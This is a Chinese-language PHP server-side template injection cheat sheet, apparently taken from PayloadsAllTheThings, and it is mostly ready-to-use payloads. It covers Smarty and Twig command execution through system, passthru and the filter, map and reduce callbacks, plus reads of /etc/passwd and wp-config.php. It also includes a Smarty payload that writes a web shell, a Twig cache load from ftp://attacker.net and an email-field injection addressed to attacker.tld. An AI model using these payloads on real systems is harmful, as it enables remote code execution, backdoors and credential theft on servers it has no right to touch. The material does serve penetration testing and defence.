# SSTI PHP - PHP服务端模板注入

[SEARCH_KEYWORDS]
漏洞类型: SSTI Server-Side Template Injection 服务端模板注入
攻击类型: Remote Code Execution File Read Information Disclosure
关键词: SSTI Smarty Twig Latte Plates Mustache Blade PHP
技术: Twig Sandbox Escape filter map reduce system passthru
框架: Smarty Twig Latte Plates patTemplate PHPlib Laravel Blade

[CONTENT]

## SSTI PHP概述

服务端模板注入(SSTI)是一种漏洞，攻击者可在服务端模板中注入恶意输入，导致模板引擎执行任意命令。PHP中SSTI可发生在Smarty、Twig等模板引擎。

## 模板库Payload格式

| 模板名 | Payload格式 |
|--------|-------------|
| Laravel Blade | `{{ }}` |
| Latte | `{var $X=""}{$X}` |
| Mustache | `{{ }}` |
| Plates | `<?= ?>` |
| Smarty | `{ }` |
| Twig | `{{ }}` |

## Smarty

```python
{$smarty.version}
{php}echo `id`;{/php}           # v3已弃用
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
{system('ls')}                  # v3兼容
{system('cat index.php')}       # v3兼容
```

## Twig

### 基本注入

```python
{{7*7}}
{{7*'7'}}                       # 结果: 49
{{dump(app)}}
{{dump(_context)}}
{{app.request.server.all|join(',')}}
```

### 读取文件

```python
{{'/etc/passwd'|file_excerpt(1,30)}}
{{include("wp-config.php")}}
```

### 命令执行

```python
{{self}}
{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# 使用filter
{{['id']|filter('system')}}
{{[0]|reduce('system','id')}}
{{['id']|map('system')|join}}
{{['id',1]|sort('system')|join}}

# 绕过空格过滤
{{['cat\x20/etc/passwd']|filter('system')}}
{{['cat$IFS/etc/passwd']|filter('system')}}

# 使用passthru
{{['id']|filter('passthru')}}
{{['id']|map('passthru')}}
```

### 通过EMAIL验证绕过

```powershell
POST /subscribe?0=cat+/etc/passwd HTTP/1.1
email="{{app.request.query.filter(0,0,1024,{'options':'system'})}}"@attacker.tld
```

## Latte

### 基本注入

```php
{var $X="POC"}{$X}
```

### 命令执行

```php
{php system('nslookup oastify.com')}
```

## patTemplate

```xml
<patTemplate:tmpl name="page">
  This is the main page.
  <patTemplate:tmpl name="hello">
    Hello {NAME}.<br/>
  </patTemplate:tmpl>
</patTemplate:tmpl>
```

## Plates

Plates是受Twig启发的原生PHP模板引擎:

```php
<?php $this->layout('template', ['title' => 'User Profile']) ?>
<h1>User Profile</h1>
<p>Hello, <?=$this->e($name)?></p>
```

## 参考文档

原始来源: PayloadsAllTheThings/Server Side Template Injection/PHP.md